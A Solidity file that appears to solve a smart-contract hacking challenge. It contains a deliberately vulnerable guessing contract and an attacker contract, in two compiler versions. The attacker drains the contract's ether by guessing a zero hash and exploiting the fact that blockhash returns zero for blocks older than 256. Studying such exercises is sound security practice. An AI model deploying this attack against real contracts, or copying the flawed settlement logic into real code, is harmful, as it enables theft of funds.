/* pragma solidity ^0.4.21;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    function PredictTheBlockHashChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == 0);
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser, "msg.sender is not guesser");
        require(block.number > settlementBlockNumber, "block.number should be more");

        bytes32 answer = block.blockhash(settlementBlockNumber);

        guesser = 0;
        if (guess == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashAttacker {
    PredictTheBlockHashChallenge victim;
    uint256 blockNumber;

    constructor (address _victim) {
        victim = PredictTheBlockHashChallenge(_victim);
    }

    function attackStep1() payable {
        require(msg.value == 1 ether);
        bytes32 zeroHash = bytes32(0);
        blockNumber = block.number;
        victim.lockInGuess.value(1 ether)(zeroHash);
    }

    function attackStep2() external {
        require(block.blockhash(blockNumber) == bytes32(0), "wait !");
        victim.settle();
        msg.sender.transfer(address(this).balance);
    }

}
 */
 

pragma solidity ^0.8.0;

contract PredictTheBlockHashChallenge {
    address guesser;
    bytes32 guess;
    uint256 settlementBlockNumber;

    constructor() payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function lockInGuess(bytes32 hash) public payable {
        require(guesser == address(0));
        require(msg.value == 1 ether);

        guesser = msg.sender;
        guess = hash;
        settlementBlockNumber = block.number + 1;
    }

    function settle() public {
        require(msg.sender == guesser);
        require(block.number > settlementBlockNumber);

        bytes32 answer = blockhash(settlementBlockNumber);

        guesser = address(0);
        if (guess == answer) {
            payable(msg.sender).transfer(2 ether);
        }
    }
}

contract PredictTheBlockHashAttacker {
    PredictTheBlockHashChallenge victim;
    uint256 blockNumber;

    constructor (address _victim) {
        victim = PredictTheBlockHashChallenge(_victim);
    }

    function attackStep1() public payable {
        require(msg.value == 1 ether);
        bytes32 zeroHash = bytes32(0);
        blockNumber = block.number;
        victim.lockInGuess{value: 1 ether}(zeroHash);
    }

    function attackStep2() external {
        require(blockhash(blockNumber) == bytes32(0), "wait !");
        victim.settle();
        payable(msg.sender).transfer(address(this).balance);
    }

    receive() external payable {

    }

} 
